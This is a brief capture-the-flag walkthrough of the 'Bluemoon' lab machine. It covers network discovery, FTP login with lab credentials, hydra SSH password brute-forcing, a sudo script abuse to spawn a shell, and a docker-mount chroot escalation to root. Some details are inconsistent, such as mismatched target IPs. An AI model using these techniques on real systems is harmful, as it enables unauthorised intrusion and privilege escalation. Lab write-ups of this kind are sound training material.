# Vulnerable Machine: Bluemoon - Walkthrough

## Discovery

Use `arp-scan` to discover the target IP:

```bash
sudo arp-scan -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:c7:7f:a3, IPv4: 192.168.56.102
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1   0a:00:27:00:00:09   (Unknown: locally administered)
192.168.56.100 08:00:27:97:2c:f6   (Unknown)
192.168.56.101 08:00:27:06:68:29   (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.845 seconds (138.75 hosts/sec). 3 responded

- Welcome -

Are You Ready To Play With Me ...!

## Maintenance!

Sorry For Delay. We Will Recover Soon. Thank You ...

zbarimg .QR_COd3.png

ftp 192.168.56.117
# username: userftp
# password: ftpp@ssword
ls -la
get information.txt
get p_list.txt
quit

hydra -l robin -P p_list.txt ssh://192.168.56.101

ssh robin@192.168.56.101

The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ED25519 key fingerprint is: SHA256:C+Z/8na2o0LXAqk7WswSnNQya1ZPegq4Cy09DR+VXTW
...
robin@192.168.56.101's password: 
Linux BlueMoon 4.19.0-14-amd64 ...
robin@BlueMoon:~$

sudo -u jerry /home/robin/project/feedback.sh

sudo -u jerry /home/robin/project/feedback.sh python -c 'import pty; pty.spawn("/bin/bash")'

docker run -v /:/mnt --rm -it alpine chroot /mnt sh